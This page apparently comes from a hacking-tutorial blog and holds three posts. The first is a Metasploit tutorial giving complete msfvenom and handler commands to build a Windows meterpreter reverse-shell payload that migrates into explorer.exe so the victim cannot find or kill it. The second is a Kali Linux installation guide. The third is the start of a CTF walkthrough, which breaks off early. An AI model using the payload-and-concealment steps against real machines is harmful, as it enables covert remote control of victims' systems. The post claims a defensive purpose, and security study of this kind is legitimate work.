---
title: 'how to Hiding Shell using PrependMigrate - Metasploit'
date: 2019-12-14T19:50:00+01:00
draft: false
---

In this article, you will get to know about the strength of mfsvenom along with PrependMigrate. You will also learn how to migrate the created payload into processes currently running on the targeted machine so, the victim unable to find the malicious file. It is very important to migrate your backdoor payload because if the target is alerted and decides to take measures to kill the process then, your session will also get killed. Therefore, an attacker must do this as soon as the session opens.  

### **Table of Content**

*   **Basic Terminologies**
    *   Metasploit Framework
    *   MSFvenom
    *   PrependMigrate
*   **Hiding shell with PrependMigrate**
    *   With MSFvenom.
    *   Without MSFvenom.

**Basic Terminologies**  
**Metasploit Framework**  
[Metasploit Framework](https://en.wikipedia.org/wiki/Metasploit_Project#Metasploit_Framework), an open-source tool for developing and executing exploit code against a remote target machine.  
**Steps for exploiting a system using the Framework include:**  

*   Choosing and configuring an exploit
*   Checking whether the intended target system is susceptible to the chosen exploit
*   Choosing and configuring a payload
*   Choosing the encoding technique
*   Executing the exploit.

This modular approach – allowing the combination of any exploit with any payload – is the major advantage of the Framework. It facilitates the tasks of attackers, exploits writers, and payload writers.   

### **Msfvenom**

MSFvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. It is used to generate and encode various types of payload that are available in the Metasploit Framework. The advantages of msfvenom are:  

*   One single tool
*   Standardized command-line options
*   Increased speed

### **PrependMigrate**

PrependMigrate is an option that allows us to link our session with an ongoing process on the target system. It can also transfer a session by linking it from one process to another. It comes handy as it is difficult for the target to find the malicious process so it becomes paramount for the attacker to cover their tracks.  
**Configurations used in Practical**  
**Attacker:**  
    OS: Kali Linux  
    IP: 192.168.1.107  
**Target:**  
 OS: Windows 10  
      IP: 192.168.1.104  

### **First Method**

Let’s start the game of conceal and seek. You have to conceal to save yourself and let the target try to find you.  
Starting with MSFvenom we will be creating a malicious executable named raj.exe and conceal the generated executable behind a process named explorer.exe (you can choose any process running on task manager) by PrependMigrate process.  

msfvenom –p windows/meterpreter/reverse\_tcp lhost=192.168.1.107 lport=1234 prpendmigrateprocess=explorer.exe prependmigrate=true -f.exe > raj.exe

1

msfvenom  –p  windows/meterpreter/reverse\_tcp lhost\=192.168.1.107  lport\=1234  prpendmigrateprocess\=explorer.exe prependmigrate\=true  \-f.exe  \>  raj.exe

![](https://i0.wp.com/1.bp.blogspot.com/-6CpBwEk3xNc/XfOLOtwnyPI/AAAAAAAAh60/7mZOyDtFHrwZlWE0dE633_68WNwZSa_nQCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)  
Next, we will be loading the Metasploit framework on Kali Linux by using the **msfconsole** keyword**.** Then set the following options to enable our handler:  

use exploit/multi/handler set payload windows/meterpreter/reverse\_tcp set lhost 192.168.1.107 set lport 1234 exploit

1

2

3

4

5

use  exploit/multi/handler

set payload windows/meterpreter/reverse\_tcp

set lhost  192.168.1.107

set lport  1234

exploit

![](https://i1.wp.com/1.bp.blogspot.com/-h9ZXYpvvKPg/XfOLO_vnRBI/AAAAAAAAh64/PEBQ4C_XM0YjhynvneZwcw8hvu5q5npzgCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)  
Now, we will send the payload to the target machine and run the executable on the Target Machine. This will generate a meterpreter session which will be captured by the listener we created earlier. You can access the target system but if the target acknowledges that the system is compromised; then they can take security measures to end your session. To escape from this situation, the attacker’s first responsibility is to conceal the executable payload behind the process so the victim cannot identify it in any way possible.  
Use the following ps command to check the processes that are running presently and filter with the raj.exe  

ps|grep raj.exe

1

ps|grep raj.exe

 The process ID (PID) of raj.exe i.e. 4848 as shown in the process list and if the victim kills the raj.exe i.e. 4848 PID then the running process will end. Thus, ending our session with a simple command:  

kill 4848

1

kill  4848

But you do not need to worry as PrependMigrate saves the day by letting us conceal raj.exe behind the explorer.exe and you will be at an advantage as your meterpreter session is still running. Even after the system reboots, the Meterpreter on the victim system attempts to connect to us every 5 seconds until it has successfully opened a session for us. And you can use the sysinfo command to confirm that the session is still up and running.  
![](https://i1.wp.com/1.bp.blogspot.com/-5BUAeDy657w/XfOLO8XKmJI/AAAAAAAAh68/oxopDraIQQAby2N_khsiNMewVsi0w_VXgCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)  

### **Second Method**

The Second way of hiding shells using the PrependMigrate but without using msfvenom. Here, the objective is the same as the earlier. We will start by opening the Metasploit Framework.  
Then use the following set of commands to create your payload:  

use windows/meterpreter/reverse\_tcp set lhost 192.168.1.107 set lport 4444 set prependmigrate true set prependmigrateprocess explorer.exe generate –f.exe - o nisha.exe

1

2

3

4

5

6

use  windows/meterpreter/reverse\_tcp

set lhost  192.168.1.107

set lport  4444

set prependmigrate true

set prependmigrateprocess explorer.exe

generate  –f.exe  \-  o  nisha.exe

![](https://i2.wp.com/1.bp.blogspot.com/-QrjDOtPPbug/XfOLPlbMFfI/AAAAAAAAh7A/U9rUpKavFo0Mk5uPcrDjiEmFWudCrxN3QCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)  
After the creation of malicious executable i.e. nisha.exe, we will create listener multi/handler using the following commands:  

use exploit/multi/handler set payload windows/meterpreter/reverse\_tcp set lhost 192.168.1.107 set lport 4444 exploit

1

2

3

4

5

use  exploit/multi/handler

set payload windows/meterpreter/reverse\_tcp

set lhost  192.168.1.107

set lport  4444

exploit

Using the ps command along with grep command we will get the PID of nisha .exe i.e.4128  

ps|grep nisha.exe

1

ps|grep nisha.exe

(Note: PID stands for process id, which means the identification number for currently running process in memory. PPID stands for Parent Process Id, which means the parent process is responsible for creating the child (current) process. Through parent Process, the child process will be created.)  
Now we try ourselves to kill the nisha.exe process to get conceal from the victim with the following command:  

kill 4128

1

kill  4128

But still, you have a victim’s session which means nisha.exe migrates into new process id of explorer.exe. And you can use the sysinfo command to confirm that the session is still up and running.  
![](https://i2.wp.com/1.bp.blogspot.com/-Iqr4prmpfeo/XfOLP14OMlI/AAAAAAAAh7E/GKxr26vAK50NBK6efhSjpVftIZbLAC4rgCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)  
**Conclusion**  
This is how one conceals themselves. The purpose of this article is to serve both the blue team and the red team as one should be aware of how to locate and eliminate the attacker as well as how to conceal yourself when you are on the other side of the line.  
**Author**: Nisha Sharma is trained in Certified Ethical hacking and Bug Bounty Hunter. Connect with her [**here**](https://www.linkedin.com/in/nishasharmaa/?originalSubdomain=in)  

[Multiple Ways to Install Kali](https://www.hackingarticles.in/multiple-ways-to-install-kali/)
==============================================================================================

posted in[Penetration Testing](https://www.hackingarticles.in/category/penetration-testing/) on [December 10, 2019](https://www.hackingarticles.in/multiple-ways-to-install-kali/ "5:18 am") by [Raj Chandel](https://www.hackingarticles.in/author/raaz/ "View all posts by Raj Chandel") with [5 Comments](https://www.hackingarticles.in/multiple-ways-to-install-kali/#comments)

In this article, we will learn how to open the magic box of ethical hacking. Can you guess the name of that box? Ok, I tell you the name is KALI the magic box of ethical hacking. Through this article, you will learn the installation of Kali  Linux on different platforms along with the features.  

### **Table of Content**

*   Introduction of kali Linux
*   Features of kali Linux
*   Prerequsities for kali Linux installtion
*   Kali installation on VM (Virtual machine)
*   Kali installation on Virtual Box
*   Kali installation on AWS
*   Kali installation on Respberry pi

### **Introduction of Kali Linux**

**“The quieter you become, the more can to hear”—Kali Linux**  
As per my definition, Kali Linux is a magic box that contains multiple magic tools to play the magic. In technical terms, Kali Linux is an open-source, Debian based Linux distribution mainly for penetration testing, security auditing, computer Forensic, Security research, etc. it contains over 600 tools of information gathering(Amap, arp-scan, APT2, etc.), vulnerability analysis (Nmap, sqlmap, BBQSQL, etc., ), wireless attack( Airbase-ng, Air crack-ng, airplay-ng, etc.), web applications(BrupSuite, zaproxy, Web Scarab), exploitation (Metasploit, Armitage, crackle), forensics (DFF, Capstone, Binwalk, etc.), etc.  
It is developed, maintained and funded by Offensive Security, a leading information security training company.  

### **Features of Kali Linux**

Free of cost –it is completely free of cost, you will never have to pay for it. All the development source code are freely available to you.  
Over 600 tools available for different functionality e.g computer forensics, penetration testing, etc  
Completely customizable – it is easy to customize based on your needs and preferences.  
Usable on a wide range of ARM devices.  

### **Prerequisites for Kali Linux Installation**

Kali OS software package required a minimum of 10 GB hard disk space for installation.  

*          Minimum 512MB Ram is required for i386 and amd64 architectures.
*          A bootable CD-DVD Drive or a USB stick.

**_Give me six hours to chop down a tree and I will spend the first for four sharpening the axe.—Abraham Lincoln_**  

### **Installation of Kali on Vmware**

Vmware Workstation enables users to set up virtual machines on a single physical machine and use them simultaneously along with the actual machine. A Virtual machine can be downloaded from [www.vmware.com](https://www.vmware.com/).  
Download kali from  [http://kali.org/downloads/](http://j.gs/4022442/kali-download) 64 bit or 32 bit as per your computer capability.  
![](https://i0.wp.com/1.bp.blogspot.com/-Un9G8PFT8lw/Xe8gTxFgDoI/AAAAAAAAh34/BKqwnoZ8IgcQMgK4Uak6uHIEZfNcbepugCLcBGAsYHQ/s1600/0.1.jpg?w=687&ssl=1)  
Click on create a new virtual machine by selecting the Installer disc image file (ISO), and review the configured virtual machine and then powered on the created kali virtual machine.  
 At the boot menu, many options are available so I am going to describe all boot menu options briefly:  
**Live (amd64)**  
Probably the one you’re searching for. This one will boot you into Kali, but only in the Live mode. That means, that when you terminate/shutdown your laptop everything you’ve saved/edited in Kali is lost. So if you make a file on your desktop, that file will be lost when you restart.  
This is possible because Kali only writes to RAM and not your HDD.  
**Live (forensic mode)**  
This is a special and interesting mode. In this mode, the internal HDD is never touched, and the auto-mounting of devices is disabled. You’ll use this when performing forensics on a device (e.g. recovering sensitive files, getting evidence in crime scenes.)  
**Live USB Persistence**  
Use this if you want to install Kali on the USB you booted from, this way you can save what you’ve done, etc. If you now place a file on your desktop, it’s saved on your USB and is again accessible when you boot from it.  
**Live USB Encrypted Persistence**  
Same as above. Alone with this option, your USB is also encrypted with LUKS. If you choose USB Persistence, choose this one!  
**(Graphical) Install                                                                                        **  
If you want to install it on your HDD.  
**Install with speech synthesis**  
Install it, the text from the installation-menu is read out to you  
But through the down arrow key, you can select Graphical install.  
![](https://i0.wp.com/1.bp.blogspot.com/-LRawaLa_KXo/Xe8gT3bH8GI/AAAAAAAAh30/2SsLq2sX0yQ9WSUB4SiFSPNzSmcIBB14ACLcBGAsYHQ/s1600/1.png?w=687&ssl=1)  
After selection of Graphical install, you will get the multiple next windows of  
Preferred language selection- English (select as per your choice) then click continue  
Location – United States (select as per your choice) click continue  
Standard keymap –  American English (select as per your choice) click on continue  
On the next screen you will ask to configure the network, select **Do not configure the network at this time** and hit the continue.  
Now in a single word, you can provide the hostname e.g. Kali (any name as per your choice). Then click on continue.  
![](https://i0.wp.com/1.bp.blogspot.com/-L1BRMgBVwhY/Xe8gXIG0bPI/AAAAAAAAh4Y/jO8UstgGqZIgdu7-yaz8eEO4FvNcRSWswCLcBGAsYHQ/s1600/2.png?w=687&ssl=1)  
Set the password for the root account. Don’t forget the password you have set for the root account otherwise you have to install kali again.  
![](https://i0.wp.com/1.bp.blogspot.com/-fszTtI6oops/Xe8gXVb5XCI/AAAAAAAAh4c/ggYqywqYp8EtH0ylwCvQPXsvavl5PzT5QCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)  
On the next screen, select the time zone and click continue.  
  
Kali detects the disk partitions. Select **guided-use entire disk** then click continue.  
![](https://i2.wp.com/1.bp.blogspot.com/-sUvLMySB4vg/Xe8gXcak2hI/AAAAAAAAh4g/Bof1bmXHdvEZ8e5fVK6Ie8ijainS4hoZgCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)  
  
Installer confirms that partition you are going to use. Click continue.  
![](https://i1.wp.com/1.bp.blogspot.com/-zGrv4tjL0KI/Xe8gYJRpfGI/AAAAAAAAh4k/78qzEUMHsmMcVm2XYzADav6WPisE9KLFACLcBGAsYHQ/s1600/5.png?w=687&ssl=1)  
  
Select the **All files in one partition** and click on continue.  
![](https://i0.wp.com/1.bp.blogspot.com/-0eOg29u4KaU/Xe8gbvZBl4I/AAAAAAAAh5Q/jDOPv4pNxrQTBw28eEl-HdVMEZnfYvlgQCLcBGAsYHQ/s1600/6.png?w=687&ssl=1)  
Selection of disk partition has been done, you can see the overview of partition disk you currently configured, and select the **Finish partitioning and write changes to disk**. After that click on continue.  
![](https://i0.wp.com/1.bp.blogspot.com/-BoGlNBJ5C_Q/Xe8ge_yKB1I/AAAAAAAAh54/lN1qcVGjW7gieMX6TQTG56xuvO72L0CkQCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)  
Click on yes to make the changes to disk as per the selected partition changes. Then click on continue.  
![](https://i1.wp.com/1.bp.blogspot.com/-SsA-OrVpiPo/Xe8gfPjy9kI/AAAAAAAAh58/cwx-cddmnVIBvtx744TIQTXonfxKmlCWQCLcBGAsYHQ/s1600/8.png?w=687&ssl=1)  
After partition, now Kali will start installing, you have to around 30 minutes for installation.  
After Kali installation, on the next screen, you will get the network mirror option. You need to select **No** and click on continue.  
![](https://i1.wp.com/1.bp.blogspot.com/-nhNULH0WyVU/Xe8gfVoKVNI/AAAAAAAAh6A/-zEdAdjKFC0S4sCMoWAKrij3cCJ3ofGXQCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)  
You get the option to install the GRUB boot loader as it should be safe to install it to the master boot record of your first hard drive. Select yes and click on continue.  
![](https://i1.wp.com/1.bp.blogspot.com/-9piu8ZxnSWM/Xe8gU1B4xCI/AAAAAAAAh4A/t0wbsaqHbycYuHt5i8rtD8-KF5Eu2lLNgCLcBGAsYHQ/s1600/10.png?w=687&ssl=1)  
Select the boot loader device for GRUB installation. Select /dev/sda and click Continue.  
![](https://i2.wp.com/1.bp.blogspot.com/-_HG3iKeqoPQ/Xe8gU1x1hsI/AAAAAAAAh4E/GdWdiT8au1cKd9wIjUfRRm-ZaK5shjMEQCLcBGAsYHQ/s1600/11.png?w=687&ssl=1)  
Now you will see the installation complete dialog box. Click to continue to finalize the installation and wait for the VM to reboot. After reboot, you will see the login screen. Log in with your username or root user and provide your password. You will then see the Kali Linux desktop.  
![](https://i1.wp.com/1.bp.blogspot.com/-vbHfZWfbO4k/Xe8gVVhTR7I/AAAAAAAAh4I/enEAYS1QLjQELIAmEz5rexYakSIXeX1BwCLcBGAsYHQ/s1600/12.png?w=687&ssl=1)  
Once the VM reboots, you will see the Kali Linux login screen.  
![](https://i0.wp.com/1.bp.blogspot.com/-08LgnF1-Dt4/Xe8gV-uPAmI/AAAAAAAAh4M/gCb4kNuQkfk54u3pwV-BK0ToaJJ_lSzYgCLcBGAsYHQ/s1600/13.png?w=687&ssl=1)  
Login with username: root, Password: toor, what you entered during the installation process earlier.  
**![](https://i1.wp.com/1.bp.blogspot.com/-KIViTXJOprM/Xe8gWADS8rI/AAAAAAAAh4Q/uWuYS1Vko3URxAog8nnpQ9BgnNT-ujz_ACLcBGAsYHQ/s1600/14.png?w=687&ssl=1) **  
Successfully, Kali installation has been done, now you can start working on Kali Linux.  
![](https://i1.wp.com/1.bp.blogspot.com/-eIulnIQC9DA/Xe8gWXuVEpI/AAAAAAAAh4U/nBpBCU-rR_UIgIKWmIDq42hpneai-OHRACLcBGAsYHQ/s1600/15.png?w=687&ssl=1)  

### **Installation of Kali Linux on Virtual Box**

VirtualBox is a software system for virtualizing the x86 computing design. It acts as a hypervisor, making a VM (virtual machine) within which the user will run another OS (operating system).  
The OS within which VirtualBox runs is named the “host” OS. The OS running within the VM is named the “guest” OS. VirtualBox supports Windows, Linux, or macOS as its host OS.  
 If you have already got put in VirtualBox then well smart otherwise install the newest version and install it from [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads).  
Prerequisites  

*   VirtualBox installed in your Linux system
*   the image of Kali Linux present in your system
*   at least 4GB of RAM
*   at least 20-30GB of free disk space
*   network to have a system updated
*   a processor with the virtualization features enabled (often activated by default)

In virtualization, the **guest OS** is the virtualized system (so our Kali Linux) and the **host OS** is our Linux system. You can summarize the configuration that was created by you. Then launch the installation  click on the green arrow button to start .  
![](https://i0.wp.com/1.bp.blogspot.com/-giNeILhgToE/Xe8gTzUkXYI/AAAAAAAAh38/zR8_Jfq0FUkYPsw-JLf9ETSJYtGd2aKiwCLcBGAsYHQ/s1600/0.png?w=687&ssl=1)  
On the next screen, you will see the installer options, select Graphical install.  
![](https://i0.wp.com/1.bp.blogspot.com/-LRawaLa_KXo/Xe8gT3bH8GI/AAAAAAAAh30/2SsLq2sX0yQ9WSUB4SiFSPNzSmcIBB14ACLcBGAsYHQ/s1600/1.png?w=687&ssl=1)  
After the selection of Graphical install, you have to follow all the steps the same as you have done at the time of installation of Kali Linux on VMware.  

### **Installation of Kali Linux On AWS**

Amazon Web Services (AWS) is a [subsidiary](https://en.wikipedia.org/wiki/Subsidiary) of [Amazon](https://en.wikipedia.org/wiki/Amazon.com) that provides [on-demand](https://en.wikipedia.org/wiki/Software_as_a_service) [cloud computing](https://en.wikipedia.org/wiki/Cloud_computing) [platforms](https://en.wikipedia.org/wiki/Computing_platform) and [APIs](https://en.wikipedia.org/wiki/Application_programming_interface) to individuals, companies, and governments, on a metered pay-as-you-go basis. In aggregate, these cloud computing [web services](https://en.wikipedia.org/wiki/Web_services) provide a set of primitive abstract technical infrastructure and [distributed computing](https://en.wikipedia.org/wiki/Distributed_computing) building blocks and tools. One of these services is [Amazon Elastic Compute Cloud](https://en.wikipedia.org/wiki/Amazon_Elastic_Compute_Cloud), which allows users to have at their disposal a [virtual](https://en.wikipedia.org/wiki/Virtualization) [cluster of computers](https://en.wikipedia.org/wiki/Computer_cluster), available all the time, through the Internet.  
For more detail description refer [https://en.wikipedia.org/wiki/Amazon\_Web\_Services](https://en.wikipedia.org/wiki/Amazon_Web_Services).  
Prerequisites  

*   An Aws account
*   Minimum 2 GB RAM (to run Metasploit)

Login to  [https://aws.amazon.com/console/](https://aws.amazon.com/console/) to navigate web services. From the compute services, select EC2 (Elastic Compute Cloud) and click on Launch Instance.  
![](https://i0.wp.com/1.bp.blogspot.com/-pqq3WdcChn8/Xe8gYYE792I/AAAAAAAAh4o/UVjqfqgI670nivlNiOwc_Ca647d2CudmgCLcBGAsYHQ/s1600/50.png?w=687&ssl=1)  
![](https://i1.wp.com/1.bp.blogspot.com/-cV1_LJkvC_I/Xe8gYvD5JqI/AAAAAAAAh4s/W-B4m5Ljo0Mw-G82XDeGAxexwpZ7agYJgCLcBGAsYHQ/s1600/51.png?w=687&ssl=1)  
Click on AWS Marketplace, to search  the AMI (Machine Image of Kali Linux)  
![](https://i1.wp.com/1.bp.blogspot.com/-hE1YrjWJRE8/Xe8gZMclHxI/AAAAAAAAh4w/pTW-nFrrqxw_aBjsMRq3qDb8BLSzVeLLgCLcBGAsYHQ/s1600/52.png?w=687&ssl=1)  
In the search, tab writes Kali Linux, to the Kali AMI  and then click on select.  
![](https://i1.wp.com/1.bp.blogspot.com/-s0m2iEkiJeY/Xe8gZR2FHfI/AAAAAAAAh40/FjNG-vkQmyQTHDfMk0ZOEeljRtOwuDhIwCLcBGAsYHQ/s1600/53.png?w=687&ssl=1)  
After selection, you can see the summary of all the instances types, software, amount available for Kali Linux. (As per your requirement you can choose, also free tier instance is also available).Then click on continue.  
![](https://i0.wp.com/1.bp.blogspot.com/-BVTwpN2PEzE/Xe8gZvk9XLI/AAAAAAAAh44/y_7CeDu9NGskO-B6mcdFbcfwYstiQAoywCLcBGAsYHQ/s1600/54.png?w=687&ssl=1)  
Now you can choose instance type as per your budget, you can select t2micro along with vcpu 1,2.5GHz, Intel Xeon Family,1GiB memory, EBS only). But to run the Metasploit to need minimum of 2 GB RAM, you can opt t2 small or t2 medium.  
![](https://i0.wp.com/1.bp.blogspot.com/-_ReHC-w559c/Xe8gaLt355I/AAAAAAAAh48/ZBRVvRoaBk8jKFdDjluaaPRYSfjlFgrDwCLcBGAsYHQ/s1600/55.png?w=687&ssl=1)  
Review the selected instance and click on the launch.  
![](https://i0.wp.com/1.bp.blogspot.com/-C4VJnhgT5HM/Xe8gabtW93I/AAAAAAAAh5A/1yvT__h3jbc1VPNNPevdRdXBfYoWE0tiQCLcBGAsYHQ/s1600/56.png?w=687&ssl=1)  
Here, you need to create a new key pair and give a name to the key . Click on download key pair as you will not be able to download the file again after it’s created. Then click on Launch Instances.  
![](https://i0.wp.com/1.bp.blogspot.com/-Kourk3Mj_Sc/Xe8gaTdTKfI/AAAAAAAAh5E/PwouR1Is6Ck1DRi2ziqH8myk92u2E4HwQCLcBGAsYHQ/s1600/57.png?w=687&ssl=1)  
Save the Downloaded .pem file.  
![](https://i1.wp.com/1.bp.blogspot.com/-3ICzRylMMsU/Xe8ga0kkOWI/AAAAAAAAh5I/Uruk6QYP2MAuKPXRYXQrrCkTujkwygROgCLcBGAsYHQ/s1600/58.png?w=687&ssl=1)  
Click on Launch Instances  
![](https://i1.wp.com/1.bp.blogspot.com/-ise4GXPdAvo/Xe8gbR_KTMI/AAAAAAAAh5M/m7xQ7r6gPzgv1Y0Eimy51-mqucVVKBIxwCLcBGAsYHQ/s1600/59.png?w=687&ssl=1)  
After Launch instance, you can see the instance is running even you can provide the name to your created instance. Click on connect to get access to SSH with other information on public DNS.  
![](https://i2.wp.com/1.bp.blogspot.com/-WSjgXugGRn8/Xe8gcfmKAaI/AAAAAAAAh5Y/aPOdGCo2w9gByn0WVGq7WC4VoaO-YiCZgCLcBGAsYHQ/s1600/61.png?w=687&ssl=1)  
![](https://i0.wp.com/1.bp.blogspot.com/-RTLtwrfNXhY/Xe8gcrdTg1I/AAAAAAAAh5c/WYpoPh2MWn0faRPLbBSQLfPcVMwZ6NZrACLcBGAsYHQ/s1600/62.png?w=687&ssl=1)  

### For a Linux user:

You can access the Kali AWS from a linux machine. Set the permissions and connect the SSH server:  

chmod 400 ignite.pem ssh -i ignite.pem root@ec2-18-221-4-175.us-east.2.compute.amazonaws.com

1

2

chmod  400  ignite.pem

ssh  \-i  ignite.pem root@ec2\-18\-221\-4\-175.us\-east.2.compute.amazonaws.com

Login with username ec2-user.  
![](https://i1.wp.com/1.bp.blogspot.com/-oyBmPcEt0U4/Xe8gc7T4pfI/AAAAAAAAh5g/8X1AmmfAm1wNuOc9FOZjm_7lQzhbYgqIwCLcBGAsYHQ/s1600/63.png?w=687&ssl=1)  

### For Window Users:

Open the puttygen and load the previously downloaded private key to convert it into a putty supported format.  
![](https://i0.wp.com/1.bp.blogspot.com/-tsI5p9V5Td4/Xe8gdFJpxPI/AAAAAAAAh5k/rrw1tMFgPIU4whqMu8LzraRU6kZADXFMQCLcBGAsYHQ/s1600/64.jpg?w=687&ssl=1)  
![](https://i1.wp.com/1.bp.blogspot.com/-_jtZZPzcE-w/Xe8gdhZ96tI/AAAAAAAAh5o/_C9nTbx5Ag8GEwliiB_Ow0thPdfE1P3DwCLcBGAsYHQ/s1600/65.jpg?w=687&ssl=1)  
Save the private key and close the Puttygen program. Open the Putty program to connect it with Kali Linux, in hostname put the public DNS details and load the private key in the Auth tab under the SSh navigation.  
Then click on open  
![](https://i1.wp.com/1.bp.blogspot.com/-WrHR2F7T6k8/Xe8gd6YhLfI/AAAAAAAAh5s/I4W9SBK8A8MS9HGa5bu7zI1QHSggbCs9gCLcBGAsYHQ/s1600/66.jpg?w=687&ssl=1)  
![](https://i1.wp.com/1.bp.blogspot.com/-65w0UMmuv5s/Xe8geDhGrpI/AAAAAAAAh5w/kbxCTKg5EGYn2LTzx-nhYTDoYzZlYKX9wCLcBGAsYHQ/s1600/67.jpg?w=687&ssl=1)  
Login with username ec2-user and your kali Linux from the cloud is ready. As this is minimal installation, to get all the tools run the command **apt-get install kali-linux-full**  
Note: You should not go over the usage limit otherwise you will be charged and need to pay the bill.  
![](https://i0.wp.com/1.bp.blogspot.com/-yx8i3U3SDeg/Xe8geMPlX7I/AAAAAAAAh50/hZBUhMDUObk1SNzpyvjgzBZ7BUnw11SeQCLcBGAsYHQ/s1600/68.jpg?w=687&ssl=1)  

### **Installation of Kali on Raspberry Pi**

The [Raspberry Pi](https://www.raspberrypi.org/) is a low-cost, credit-card-sized ARM computer. Despite being a good bit less powerful than a laptop or desktop PC, its affordability makes it an excellent option for a tiny Linux system and it can do far more than act as a media hub.  
The Raspberry Pi provides an SD card slot for mass storage and will attempt to boot off that device when the board is powered on.  
![](https://i1.wp.com/1.bp.blogspot.com/-kCYpQRmXLmY/Xe8lp9l1l3I/AAAAAAAAh6o/Lc1C85Y3ZiciJSadUaqFbmKzF1Uh2mFmwCLcBGAsYHQ/s1600/pi.png?w=687&ssl=1)  
By default, the Kali Linux Raspberry Pi image has been streamlined with the minimum tools, similar to all the other ARM images. If you wish to upgrade the installation to a standard desktop installation, you can include the extra tools by installing the **kali-Linux-full** meta-package.  
For more details please refer [https://github.com/thehackingsage/HackPi](https://github.com/thehackingsage/HackPi).  
Prerequisites  

*   Kali Linux Raspberry 2,3, 4 ARM images.
*   SD card (minimum size 8 GB but can use 16GB 0r even 32 Gb)
*   Bootable Kali

First, download the Kali Linux 2 or more image file for a raspberry file from the [https://www.offensive-security.com/kali-linux-arm-images/#1493408272250-e17e9049-9ce8](https://www.offensive-security.com/kali-linux-arm-images/#1493408272250-e17e9049-9ce8).  
I need to write it to the SD card. Choose the Kali Linux ISO file to be imaged with “select image” and verify that the USB drive to be overwritten is the correct one. Click the “Flash!” button once ready.  
Once Etcher alerts you that the image has been flashed, you can safely remove the USB drive and proceed to boot into Kali with it.  
Now, you can have a plugged raspberry pi device with the bootable SD card into the monitor. After powering up the raspberry pi 3 b, it will go through a bootup process and the screen will go blank for a few seconds.  
For the final step, a login prompt will appear asking for a username and a password. The default should be ‘root’ and ‘toor’ respectively.  
Thank you  
**Author**: Nisha Sharma is trained in Certified Ethical hacking and Bug Bounty Hunter. Connect with her [**here**](https://www.linkedin.com/in/nishasharmaa/?originalSubdomain=in)  

[In Plain Sight:1: Vulnhub Walkthrough](https://www.hackingarticles.in/in-plain-sight1-vulnhub-walkthrough/)
============================================================================================================

posted in[CTF Challenges](https://www.hackingarticles.in/category/ctf-challenges/) on [December 8, 2019](https://www.hackingarticles.in/in-plain-sight1-vulnhub-walkthrough/ "4:48 pm") by [Raj Chandel](https://www.hackingarticles.in/author/raaz/ "View all posts by Raj Chandel") with [6 Comments](https://www.hackingarticles.in/in-plain-sight1-vulnhub-walkthrough/#comments)

In today’s article, we will face an Intermediate challenge. Introducing the In Plain Sight:1 virtual machine, created by “[bzyo\_](https://twitter.com/bzyo_)” and is available on Vulnhub. This is another Capture the Flag challenge where we have to escalate privileges to find the root flag to complete the challenge.  
Since these labs are available on the Vulnhub Website. We will be downloading the lab file from this [link](https://www.vulnhub.com/entry/in-plain-sight-1,400/).  

### Penetration Testing Methodology

*   **Network Scanning**
    *   netdiscover
    *   nmap port scan
*   **Enumeration**
    *   FTP Enumeration
    *   Browsing HTTP Service
    *   Enumerating the wordpress
*   **Exploitation**
    *   Get a meterpreter session
*   **Post Exploitation**
    *   Reading passwords from file
    *   Login into MySQL to find hashes
    *   Using john to crack the hashes
*   **Privilege Escalation**
    *   Using su command
    *   Finding password
    *   Checking for SUID

### Walkthrough

### Network Scanning

The first step is to identify the target. So, to identify our target we will use the following command:  

netdiscover

1

netdiscover

![](https://i1.wp.com/1.bp.blogspot.com/--Z1u0a1VaeM/Xe0dtrjGsWI/AAAAAAAAh1Q/aF08lD-IVagN4jJD-TxReCMIW1tSjGckACEwYBhgL/s1600/1.png?w=687&ssl=1)  
Now we will use Nmap to gain information about the open ports and the services running on the target machine and for this, type the following command :  

nmap -p- 192.168.43.8

1

nmap  \-p\-  192.168.43.8

![](https://i1.wp.com/1.bp.blogspot.com/-PW91KRfChOo/Xe0dxQQLR-I/AAAAAAAAh1U/kt42gCdx_hEp_lCPklGnluA9fB4Js315gCEwYBhgL/s1600/2.png?w=687&ssl=1)  
From the nmap scan, we can see that Port 21, 22, 80 are open, it means we have the FTP, SSH and HTTP services running simultaneously. Firstly, let’s try enumeration with an anonymous login on FTP.  
![](https://i1.wp.com/1.bp.blogspot.com/-TYkbqWi-4QA/Xe0d1fWlBCI/AAAAAAAAh1Q/tqhDBg664qMDyed1jLnLl-k0li1hnxodQCEwYBhgL/s1600/3.png?w=687&ssl=1)  
After logging in anonymously, we can see that there is a file todo.txt. Download this file using the get command. The content of todo.txt file doesn’t seem to be useful. You can read the file by using cat command.  
As FTP wasn’t useful to us, we can now browse the website to see if we can find some information. And for this, open the IP address in our browser.  
![](https://i1.wp.com/1.bp.blogspot.com/-TYkbqWi-4QA/Xe0d1fWlBCI/AAAAAAAAh1Q/tqhDBg664qMDyed1jLnLl-k0li1hnxodQCEwYBhgL/s1600/3.png?w=687&ssl=1)  
This is an Apache2 Ubuntu Default page but after exploring it carefully we can see a line hinting to “/var/www/html/index.htnl”. So, let’s explore this page.  
![](https://i1.wp.com/1.bp.blogspot.com/-ZBoFUZRX3SI/Xe0d2sty_uI/AAAAAAAAh1U/CIX3ox0eHB4oM-CQYyGrTtFRKvmM0Hl_QCEwYBhgL/s1600/5.png?w=687&ssl=1)  
This page looks like a normal page but when we click anywhere on the page then it will lead us to the following new webpage :  
![](https://i1.wp.com/1.bp.blogspot.com/-72xwqqOFSp0/Xe0d2-ucatI/AAAAAAAAh1M/8gSpEIo91wA5oGYwk5IevyVuGJ-yPOuDQCEwYBhgL/s1600/6.png?w=687&ssl=1)  
As we can see that this webpage lets you upload any image. So here we tried to upload the image and we succeed but when we try to upload a .php file the webpage give us an error. Upon exploring more, the URL of the webpage caught our attention and you can see that it looks like a hash so we copied it and tried to crack it by using the john.  
![](https://i2.wp.com/1.bp.blogspot.com/-ZA_Z8tlXlgA/Xe0d3dRftxI/AAAAAAAAh1M/9hgISdeloAwf9pBF0noH7RwL0ZRdGXEjwCEwYBhgL/s1600/7.png?w=687&ssl=1)  
It was **“goodluck”**. At this point, we were just being trolled.  
